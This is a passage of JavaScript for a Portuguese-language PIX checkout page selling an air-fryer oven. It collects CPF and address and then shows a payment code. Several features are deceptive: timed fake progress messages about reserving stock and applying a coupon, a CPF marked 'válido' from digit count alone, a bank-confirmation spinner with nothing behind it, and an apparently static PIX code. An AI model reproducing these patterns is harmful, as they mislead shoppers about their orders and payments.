                                        e("input", { ref: cpfInputRef, type: "text", name: "cpf", value: formData.cpf, onChange: handleCpfChange, className: `w-full py-3.5 pl-11 pr-4 bg-white border ${formData.cpf && formData.cpf.replace(/\D/g, '').length === 11 ? 'border-green-500 bg-green-50/30' : 'border-slate-200'} rounded-xl text-slate-700 text-base shadow-sm placeholder:text-slate-300 outline-none transition-all duration-200`, placeholder: "000.000.000-00", inputMode: "numeric", disabled: isFormLocked || isSubmitting, autoComplete: "off", maxLength: 14, autoCorrect: "off", autoCapitalize: "off", spellCheck: "false" })
                                    ),
                                    formData.cpf && e("div", {className: "flex items-center gap-2 mt-1.5 px-1"},
                                        e("div", {className: "flex-1 h-1.5 bg-gray-100 rounded-full overflow-hidden"}, e("div", { className: `h-full rounded-full transition-all duration-500 ${formData.cpf.replace(/\D/g, '').length >= 11 ? 'bg-green-500 w-full' : 'bg-gray-300 w-2/3'}` })),
                                        e("span", { className: `text-[10px] font-semibold transition-colors ${formData.cpf.replace(/\D/g, '').length >= 11 ? 'text-green-600' : 'text-gray-400'}` }, formData.cpf.replace(/\D/g, '').length >= 11 ? 'CPF Válido' : 'Digitando...')
                                    )
                                )
                            )
                        ),
                        e("div", { className: "bg-white rounded-2xl shadow-[0_2px_15px_rgb(0,0,0,0.03)] border border-slate-100 overflow-hidden" },
                            e("div", { className: "bg-slate-50/50 px-5 py-3 border-b border-slate-100 flex items-center gap-3" }, e("span", { className: "bg-green-600 text-white text-xs font-bold w-6 h-6 rounded-full flex items-center justify-center shadow-md shadow-green-600/20" }, "2"), e("h3", { className: "text-sm font-bold text-slate-700 uppercase tracking-wide" }, "Entrega")),
                            e("div", {className: "p-5 pt-6 space-y-4"},
                                e("div", {className: "relative"},
                                    e("label", { className: "text-[11px] font-bold text-slate-500 uppercase tracking-wide pl-1 mb-1.5 block" }, "CEP"),
                                    e("div", {className: "relative"},
                                        e("input", { ref: cepInputRef, type: "text", name: "cep", value: formData.cep, onChange: handleCepChange, className: "w-full py-3.5 pl-4 pr-12 border border-slate-200 rounded-xl text-base focus:border-green-500 focus:ring-4 focus:ring-green-500/10 outline-none transition-all duration-200 shadow-sm", placeholder: "00000-000", inputMode: "numeric", disabled: isFormLocked || isSubmitting, autoComplete: "postal-code", maxLength: 9, autoCorrect: "off", autoCapitalize: "off", spellCheck: "false" }),
                                        e("div", { className: "absolute inset-y-0 right-3 flex items-center" }, loadingCep ? e("div", { className: "spinner-mobile border-green-500 border-t-transparent" }) : e("svg", { className: "w-5 h-5 text-gray-400", fill: "none", viewBox: "0 0 24 24", stroke: "currentColor" }, e("path", { strokeLinecap: "round", strokeLinejoin: "round", strokeWidth: 2, d: "M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" })))
                                    )
                                ),
                                e("div", { className: "bg-gradient-to-r from-green-50 to-emerald-50 border border-green-100 rounded-xl p-4 flex items-center gap-4 animate-pulse-slow shadow-sm" },
                                    e("div", { className: "bg-white p-2.5 rounded-full shadow-sm text-green-600" }, e(Icons.Truck, {className: "w-5 h-5"})),
                                    e("div", {className: "flex-1"}, e("p", { className: "text-[10px] uppercase tracking-wider text-green-800 font-bold mb-0.5 opacity-80" }, "Frete Grátis Chegando:"), e("p", { className: "text-sm font-black text-green-900 capitalize leading-none tracking-tight" }, getDeliveryDate()))
                                ),
                                cepFailed && e("div", { className: "bg-rose-50 border border-rose-100 text-rose-700 text-xs font-semibold rounded-xl p-3" }, "Não conseguimos buscar seu endereço automaticamente. Preencha abaixo para finalizar.") ,
                                shouldShowAddressFields && e("div", { className: "grid grid-cols-4 gap-3 animate-fade-in" },
                                    e("div", {className: "col-span-4"}, e("label", { className: "text-[10px] font-bold text-gray-400 uppercase pl-1 mb-1 block" }, "Endereço"), e("input", { name: "address", value: formData.address, onChange: handleChange, className: "w-full p-3.5 bg-white border border-slate-200 rounded-xl text-slate-600 text-sm font-medium focus:border-green-500 outline-none", placeholder: "Rua, Avenida...", disabled: isFormLocked || isSubmitting, autoComplete: "street-address", autoCorrect: "off", spellCheck: "false" })),
                                    e("div", {className: "col-span-1"}, e("label", { className: "text-[10px] font-bold text-gray-400 uppercase pl-1 mb-1 block" }, "Nº"), e("input", { ref: numberRef, name: "number", value: formData.number, onChange: handleChange, placeholder: "123", className: "w-full p-3.5 border border-green-300 bg-white ring-2 ring-green-500/10 rounded-xl focus:ring-green-500 focus:border-green-500 outline-none font-bold text-center", inputMode: "numeric", disabled: isFormLocked || isSubmitting, autoComplete: "off" })),
                                    e("div", {className: "col-span-3"}, e("label", { className: "text-[10px] font-bold text-gray-400 uppercase pl-1 mb-1 block" }, "Cidade"), e("input", { name: "city", value: formData.city, onChange: handleChange, className: "w-full p-3.5 bg-white border border-slate-200 rounded-xl text-slate-600 text-sm font-medium focus:border-green-500 outline-none", placeholder: "Cidade/UF", disabled: isFormLocked || isSubmitting, autoComplete: "address-level2", autoCorrect: "off", spellCheck: "false" }))
                                )
                            )
                        ),
                        e("div", { className: "hidden lg:block bg-white rounded-2xl shadow-[0_2px_15px_rgb(0,0,0,0.03)] border border-slate-100 overflow-hidden" },
                            e("div", { className: "bg-slate-50/50 px-5 py-3 border-b border-slate-100 flex items-center gap-3" }, e("span", { className: "bg-green-600 text-white text-xs font-bold w-6 h-6 rounded-full flex items-center justify-center shadow-md shadow-green-600/20" }, "3"), e("h3", { className: "text-sm font-bold text-slate-700 uppercase tracking-wide" }, "Pagamento")),
                            e("div", {className: "p-5"},
                                e("div", { className: "bg-green-50/50 border-2 border-green-500 rounded-xl p-4 relative flex items-center gap-4 cursor-pointer hover:bg-green-50 transition-colors shadow-sm ring-4 ring-green-500/5" },
                                    e("div", { className: "absolute -top-3 right-4 bg-gradient-to-r from-green-600 to-green-500 text-white text-[10px] font-bold px-3 py-1 rounded-full uppercase shadow-md tracking-wide" }, "Aprovação Imediata"),
                                    e("div", { className: "w-6 h-6 bg-green-500 rounded-full flex items-center justify-center shadow-md flex-shrink-0 text-white" }, e(Icons.Check, {className: "w-4 h-4"})),
                                    e("div", {className: "flex-1 py-1"}, e("div", { className: "font-bold text-slate-800 text-sm flex items-center gap-1.5" }, "PIX"), e("div", { className: "text-green-700 font-extrabold text-xl mt-0.5 tracking-tight" }, "R$ " + PRODUCT_INFO.price.toFixed(2).replace('.',',')))
                                ),
                                e("button", { ref: submitButtonRef, disabled: loading || isFormLocked || isSubmitting, type: "submit", className: `w-full mt-6 bg-gradient-to-r from-green-600 to-green-700 text-white font-bold py-4 rounded-xl text-lg transition-all active:scale-[0.98] flex justify-center items-center gap-2 shadow-xl shadow-green-500/30 ${loading || isFormLocked || isSubmitting ? 'opacity-80 grayscale cursor-not-allowed' : 'hover:shadow-green-500/50 hover:-translate-y-0.5'} btn-tactile min-h-[56px]`, "aria-busy": loading }, 
                                    loading ? e("span", {className: "flex items-center gap-2"}, e("div", { className: "spinner-mobile" }), "Processando...") : e("span", {className: "flex items-center gap-2"}, "FINALIZAR COM DESCONTO", e("svg", { className: "w-5 h-5", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "3" }, e("polyline", {points: "9 18 15 12 9 6"})))
                                ),
                                e("div", {className: "mt-3 text-[10px] text-slate-500 leading-snug"},
                                    "Ao clicar em 'Finalizar compra', você aceita que a Izzat processe o pedido, concorda com os ",
                                    e("a", { href: "/termos-de-compra/", className: "underline" }, "Termos de compra"),
                                    ", com a ",
                                    e("a", { href: "/politica-de-privacidade/", className: "underline" }, "Política de Privacidade"),
                                    " e confirmação de maioridade ou supervisão de tutor. ",
                                    e("span", { className: "opacity-80" }, "REF: "),
                                    e("a", { href: "/ref/", className: "underline opacity-80" }, ((window.getRefCode && window.getRefCode()) || '—'))
                                ),
                                e("div", {className: "text-center mt-3"}, e("span", { className: "text-[10px] text-gray-400 flex justify-center items-center gap-1" }, e(Icons.Lock, {className: "w-3 h-3"}), "Seus dados estão protegidos por criptografia 256-bit"))
                            )
                        )
                    ),
                ),
                e("div", {className: "lg:hidden checkout-fixed-footer"},
                    e("button", { ref: mobileSubmitButtonRef, 
                        onTouchStart: handleMobileSubmitTap,
                        onClick: handleMobileSubmitTap,
                        disabled: loading || isFormLocked || isSubmitting, 
                        type: "button", 
                        className: `w-full bg-gradient-to-r from-green-600 to-green-700 text-white font-bold py-4 rounded-xl text-lg transition-all active:scale-[0.98] flex justify-center items-center gap-2 shadow-xl shadow-green-500/30 ${loading || isFormLocked || isSubmitting ? 'opacity-80 grayscale cursor-not-allowed' : 'hover:shadow-green-500/50'} btn-tactile min-h-[56px]`, "aria-busy": loading }, 
                        loading ? e("span", {className: "flex items-center gap-2"}, e("div", { className: "spinner-mobile" }), "Processando...") : e("span", {className: "flex items-center gap-2"}, "FINALIZAR COM DESCONTO", e("svg", { className: "w-5 h-5", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "3" }, e("polyline", {points: "9 18 15 12 9 6"})))
                    ),
                    e("div", {className: "mt-2 text-center text-[10px] text-slate-500 leading-snug px-1"},
                        "Ao clicar em 'Finalizar compra', você aceita que a Izzat processe o pedido, concorda com os ",
                        e("a", { href: "/termos-de-compra/", className: "underline" }, "Termos de compra"),
                        ", com a ",
                        e("a", { href: "/politica-de-privacidade/", className: "underline" }, "Política de Privacidade"),
                        " e confirmação de maioridade ou supervisão de tutor. ",
                        e("span", { className: "opacity-80" }, "REF: "),
                        e("a", { href: "/ref/", className: "underline opacity-80" }, ((window.getRefCode && window.getRefCode()) || '—'))
                    )
                )
            );
        }

        function PixScreen({ customerData, pixCode, qrCodeUrl }) {
            const [loadingState, setLoadingState] = useState(0); 
            const [copied, setCopied] = useState(false);
            const [keyboardClosed, setKeyboardClosed] = useState(false);
            
            const activeData = customerData || {};
            const firstName = activeData.firstName || 'Cliente';
            const transactionId = activeData.transactionId || 'ERR_NO_ID';

            const effectivePixCode = (pixCode && String(pixCode).trim()) ? String(pixCode).trim() : DEFAULT_CODIGO_PIX_COPIA_COLA;
            let effectiveQrUrl = (typeof qrCodeUrl === 'string' && qrCodeUrl.trim()) ? qrCodeUrl.trim() : DEFAULT_URL_IMAGEM_QRCODE;

            // Normaliza URLs relativas (ex: 'assets/img/qrcode.webp') para não quebrar em /checkout/
            try {
                if (effectiveQrUrl && typeof effectiveQrUrl === 'string') {
                    const isHttp = /^https?:\/\//i.test(effectiveQrUrl);
                    if (!isHttp && !effectiveQrUrl.startsWith('/')) {
                        effectiveQrUrl = '/' + String(effectiveQrUrl).replace(/^\/+/, '');
                    }
                }
            } catch(e) {}

            useEffect(() => {
                if (document.activeElement && document.activeElement.blur) document.activeElement.blur();
                requestAnimationFrame(() => { window.scrollTo({ top: 0, behavior: 'smooth' }); });
                
                if (customerData && customerData.transactionId) {
                    // ✅ Anti-vazamento: nunca envie email/telefone/CPF/endereço no tracking
                    trackEvent('CompletePayment', { 
                        ...window.PRODUCT_CONTENT, 
                        content_name: 'Fritadeira Elétrica Forno Oven 12L Mondial AFON-12L-BI', 
                        value: 197.99, 
                        currency: 'BRL', 
                        order_id: customerData.transactionId, 
                        event_id: window.generateEventId(),
                        ref: (window.getRefCode ? (window.getRefCode() || '') : '')
                    });
                }
                
                const step1 = setTimeout(() => setLoadingState(1), 500);
                const step2 = setTimeout(() => setLoadingState(2), 1200); 
                const step3 = setTimeout(() => { setLoadingState(3); setKeyboardClosed(true); }, 2000); 
                
                return () => { clearTimeout(step1); clearTimeout(step2); clearTimeout(step3); };
            }, [transactionId]);

            const copyPix = async () => { 
                // ⭐️ RASTREAMENTO DE CÓPIA DO PIX ⭐️
                trackEvent('Pix_Copy_Click', { event_id: window.generateEventId(), order_id: transactionId });

                // contador (admin) - cliques no botao Copiar PIX
                try {
                    const payload = JSON.stringify({ ts: Date.now(), order_id: transactionId });
                    if (navigator.sendBeacon) {
                        navigator.sendBeacon('/api/metrics/pix-copy', payload);
                    } else {
                        fetch('/api/metrics/pix-copy', { method: 'POST', headers: { 'content-type': 'application/json' }, body: payload, keepalive: true }).catch(() => {});
                    }
                } catch (e) {}


                try { 
                    await window.safeCopyToClipboard(effectivePixCode);
                    setCopied(true);
                    trackEvent('ClickButton', { button_name: 'copy_pix_code', content_name: 'Cópia PIX' });
                } catch (err) {
                    let ok = false;
                    try {
                        if (typeof window.fallbackCopy === 'function') ok = window.fallbackCopy(effectivePixCode);
                        else if (typeof fallbackCopy === 'function') ok = fallbackCopy(effectivePixCode);
                    } catch(_) {}
                    if (!ok) {
                        try { window.prompt('Copie o código PIX abaixo:', effectivePixCode); } catch(_) {}
                    }
                    setCopied(true);
                }
                setTimeout(() => setCopied(false), 2000); 
            };

            if (loadingState < 3) return e("div", { className: "min-h-screen bg-slate-50 flex flex-col items-center justify-center p-6 text-center font-sans safe-area-padding" }, 
                e("div", { className: "w-20 h-20 border-[6px] border-slate-200 border-t-green-500 rounded-full animate-spin mb-8 shadow-2xl shadow-green-500/20" }), 
                e("h2", { className: "text-2xl font-bold text-slate-800 animate-pulse tracking-tight" }, loadingState === 0 && "Iniciando transação segura...", loadingState === 1 && "Reservando estoque...", loadingState === 2 && "Aplicando cupom de oferta..."), 
                e("p", { className: "text-sm text-slate-500 mt-4 font-medium" }, "Por favor, não feche esta página.")
            );
            
            return e("div", { className: "min-h-screen bg-[#f8fafc] flex flex-col items-center justify-center p-4 font-sans py-10 pb-safe-bottom safe-area-padding" },
                e("div", { className: `bg-white w-full max-w-[480px] lg:max-w-5xl rounded-2xl shadow-[0_10px_40px_-10px_rgba(0,0,0,0.08)] p-6 sm:p-8 lg:p-10 border border-slate-100 transition-all duration-500 ${keyboardClosed ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}` },
                    e("div", { className: "grid grid-cols-1 lg:grid-cols-12 gap-6 lg:gap-12 items-start" },
                        e("div", {className: "lg:col-span-6 lg:row-start-1"},
                            e("div", {className: "text-center lg:text-left mb-6"}, 
                                e("div", { className: "w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto lg:mx-0 mb-4 shadow-sm" }, e(Icons.Check, {className: "w-8 h-8"})),
                                e("h1", { className: "text-2xl font-black text-slate-800 leading-tight mb-2 tracking-tight" }, "Quase lá, " + firstName + "!"),
                                e("p", {className: "text-sm text-slate-500"}, "Finalize o pagamento para garantir a oferta.")
                            ),
                            e("div", { className: "bg-green-50/80 border border-green-100 text-green-700 font-bold text-xs py-3 rounded-lg text-center mb-6 uppercase tracking-wide shadow-sm flex items-center justify-center gap-2" }, e(Icons.Lock, {className: "w-3 h-3"}), "Pedido Reservado com Sucesso")
                        ),
                        e("div", {className: "lg:col-span-6 lg:col-start-7 lg:row-start-1 lg:row-span-2"},
                            effectiveQrUrl && e("div", {className: "hidden lg:flex justify-center mb-6"}, e("div", {className: "bg-white p-2 border-2 border-slate-100 rounded-xl shadow-sm"}, e("img", { src: effectiveQrUrl, className: "w-48 h-48 object-contain rounded-lg", alt: "QR Code PIX", loading: "eager", onError: (e) => e.target.style.display = 'none' }))),
                            e("div", {className: "mb-8"},
                                e("div", {className: "flex justify-between items-center mb-6 px-2"}, 
                                    ['Copiar', 'App Banco', 'Colar', 'Pagar'].map((step, index) => 
                                        e("div", {key: index, className: "flex flex-col items-center group"}, e("div", { className: `w-10 h-10 rounded-full flex items-center justify-center mb-2 transition-all ${index === 0 ? 'bg-green-600 text-white shadow-lg shadow-green-500/30 scale-110' : 'bg-slate-100 text-slate-400'}` }, e("span", {className: "font-bold text-sm"}, index + 1)), e("span", { className: `text-[10px] font-bold uppercase tracking-wide ${index === 0 ? 'text-green-700' : 'text-slate-300'}` }, step))
                                    )
                                ),
                                e("div", { className: "relative bg-slate-50 rounded-xl border-2 border-dashed border-slate-300 p-4 hover:border-green-400 transition-colors group" }, 
                                    e("div", { className: "absolute -top-3 left-4 bg-white px-2 text-xs font-bold text-slate-500 uppercase tracking-wide" }, "Código PIX"),
                                    e("div", { className: "w-full text-slate-400 text-xs font-mono break-all line-clamp-2 select-all mb-4 mt-1 opacity-70" }, effectivePixCode),
                                    e("button", { onClick: copyPix, className: `w-full py-4 rounded-xl font-bold text-white shadow-lg flex items-center justify-center gap-2.5 transition-all transform active:scale-[0.98] min-h-[52px] ${copied ? 'bg-slate-800' : 'bg-[#22c55e] hover:bg-green-600 hover:shadow-green-500/40'} btn-tactile` }, copied ? e(React.Fragment, null, e("svg", { key: "icon-cpy", className: "w-5 h-5", viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "3", strokeLinecap: "round", strokeLinejoin: "round" }, e("polyline", {points: "20 6 9 17 4 12"})), "CÓDIGO COPIADO!") : e(React.Fragment, null, e(Icons.Copy, {key: "icon-nocpy", className: "w-5 h-5"}), "CLIQUE PARA COPIAR"))
                                ),
                                e("div", {className: "flex justify-between items-center mt-4 px-2"}, e("span", {className: "text-sm text-slate-500 font-medium"}, "Valor Total:"), e("span", {className: "text-xl font-black text-slate-800"}, "R$ " + PRODUCT_INFO.price.toFixed(2).replace('.',','))),
                                e("div", { className: "bg-amber-50 border border-amber-100 text-amber-700 font-bold text-sm py-3 rounded-lg text-center mt-6 shadow-sm flex items-center justify-center gap-2" }, e("div", { className: "w-4 h-4 border-2 border-amber-600 border-t-transparent rounded-full animate-spin" }), "Aguardando confirmação do banco..."),
                                e("p", {className: "text-[10px] text-slate-400 text-center mt-6 font-mono"}, "ID: " + transactionId)
                            )
                        ),
                        e("div", {className: "lg:col-span-6 lg:row-start-2 lg:col-start-1"},
                            e("div", {className: "bg-slate-50 border border-slate-100 rounded-xl p-5"}, 
                                e("h4", { className: "text-xs font-bold text-slate-400 uppercase mb-3 tracking-wide" }, "Como Pagar:"),
                                ["Abra o aplicativo do seu banco", "Selecione PIX > Pix Copia e Cola", "Cole o código copiado", "Confirme os dados e o valor"].map((text, idx) => e("div", {key: idx, className: "flex gap-3 items-start mb-2 last:mb-0"}, e("div", { className: "bg-white border border-slate-200 text-green-600 w-5 h-5 rounded-full flex-shrink-0 flex items-center justify-center text-[10px] font-bold mt-0.5 shadow-sm" }, idx + 1), e("p", {className: "text-sm text-slate-600 leading-snug font-medium"}, text)))
                            )
                        )
                    )
                )
            );
        }

        function App() {
            const [screen, setScreen] = useState('checkout');
            const [customerData, setCustomerData] = useState(null);
            const [pixConfig, setPixConfig] = useState({ pixCode: DEFAULT_CODIGO_PIX_COPIA_COLA, qrCodeUrl: DEFAULT_URL_IMAGEM_QRCODE });
            
            useEffect(() => {
                const skeleton = document.getElementById('skeleton-loader');
                if (skeleton) {
                    setTimeout(() => {
                        skeleton.style.transition = 'opacity 0.3s ease-out';
                        skeleton.style.opacity = '0';
                        try { skeleton.style.pointerEvents = 'none'; } catch(e) {}
                        setTimeout(() => { skeleton.style.display = 'none'; }, 300);
                    }, 100);
                }
            }, []);

            // Carrega configuração dinâmica do PIX (Painel)
            // Cloudflare Pages: via Pages Function /api/pix-config
            useEffect(() => {
                (async () => {
                    try {
                        const res = await fetch(`/api/pix-config?_=${Date.now()}`, { cache: 'no-store' });
                        if (!res || !res.ok) return;
                        const cfg = await res.json();
                        if (!cfg || typeof cfg !== 'object') return;

                        const next = {};
                        if (typeof cfg.pix_code === 'string') next.pixCode = cfg.pix_code;
                        if (typeof cfg.qrcode_url === 'string') next.qrCodeUrl = cfg.qrcode_url;
                        if (cfg.qrcode_url === null) next.qrCodeUrl = '';

                        if (Object.keys(next).length) {
                            setPixConfig(prev => ({ ...prev, ...next }));
                        }
                    } catch (e) {
                        // silencioso
                    }
                })();
            }, []);


            // ✅ Navegação (WebView / TikTok): cria histórico interno para o botão voltar do celular
            // não fechar a página quando o usuário estiver na tela do PIX.
            useEffect(() => {
                try {
                    const st = window.history.state || {};
                    if (!st.__checkoutApp) {
                        window.history.replaceState({ __checkoutApp: true, screen: 'checkout' }, document.title);
                    }
                } catch(e) {}

                const onPop = (ev) => {
                    try {
                        const st = ev && ev.state ? ev.state : null;
                        if (st && st.__checkoutApp) {
                            setScreen(st.screen === 'pix' ? 'pix' : 'checkout');
                        }
                    } catch(e) {}
                };

                try { window.addEventListener('popstate', onPop); } catch(e) {}
                return () => { try { window.removeEventListener('popstate', onPop); } catch(e) {} };
            }, []);

            useEffect(() => {
                try {
                    if (screen === 'pix') {
                        const st = window.history.state || {};
                        if (!(st && st.__checkoutApp && st.screen === 'pix')) {
                            window.history.pushState({ __checkoutApp: true, screen: 'pix' }, document.title);
                        }
                    }
                } catch(e) {}
            }, [screen]);

            return screen === 'checkout' ? e(CheckoutScreen, { onSuccess: (data) => { setCustomerData(data); setScreen('pix'); } }) : e(PixScreen, { customerData: customerData, pixCode: pixConfig.pixCode, qrCodeUrl: pixConfig.qrCodeUrl });
        }
        
        const rootElement = document.getElementById('checkout-root');
        if (rootElement) {
            // ⭐️ CORREÇÃO 5: Evita race condition se o script for executado duas vezes
            if (!window.checkoutMounted) {
                window.checkoutMounted = true;
                try {
                    if (ReactDOM.createRoot) {
                        const root = ReactDOM.createRoot(rootElement);
                        root.render(e(App));
                    } else if (ReactDOM.render) {
                        ReactDOM.render(e(App), rootElement);
                    } else {
                        throw new Error('ReactDOM render API not found');
                    }
                } catch (err) {
                    console.error('Erro ao montar checkout:', err);
                    try {
                        const sk = document.getElementById('skeleton-loader');
                        const target = sk || rootElement;
                        if (target) {
                            target.innerHTML = '' +
                                '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:60vh;padding:24px;text-align:center;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;">' +
                                '<div style="font-weight:800;font-size:18px;color:#0f172a;margin-bottom:8px;">Não foi possível iniciar o checkout</div>' +
                                '<div style="font-size:13px;color:#475569;max-width:420px;line-height:1.4;">Tente recarregar a página. Se estiver no navegador do TikTok/Instagram, às vezes ajuda abrir no Chrome/Safari.</div>' +
                                '<button style="margin-top:16px;background:#16a34a;color:#fff;border:none;border-radius:12px;padding:14px 18px;font-weight:800;font-size:14px;min-height:44px;width:100%;max-width:320px;cursor:pointer;" onclick="location.reload()">Recarregar</button>' +
                                '</div>';
                        }
                    } catch(e) {}
                }
            }
        }
    };
    
    document.addEventListener('DOMContentLoaded', function() { 
        if(window.initReactCheckout) window.initReactCheckout(); 
    });